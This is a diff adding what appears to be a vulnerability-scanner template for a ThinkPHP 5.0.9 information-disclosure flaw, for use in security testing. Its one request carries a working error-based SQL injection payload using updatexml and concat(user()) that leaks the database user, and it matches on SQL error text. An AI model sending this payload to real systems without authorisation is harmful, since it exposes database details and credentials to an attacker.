@@ -1,0 +1,25 @@
+id: thinkphp-509-information-disclosure
+brief:
+    title: ThinkPHP 5.0.9 - Information Disclosure
+    by: dr_set
+    level: critical
+    about: ThinkPHP 5.0.9 includes verbose SQL error message that can reveal sensitive information including database credentials.
+    label:
+        - thinkphp
+        - vulhub
+        - sqli
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
+      signs:
+        - "on": word
+          has:
+            - SQLSTATE
+            - XPATH syntax error
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 500
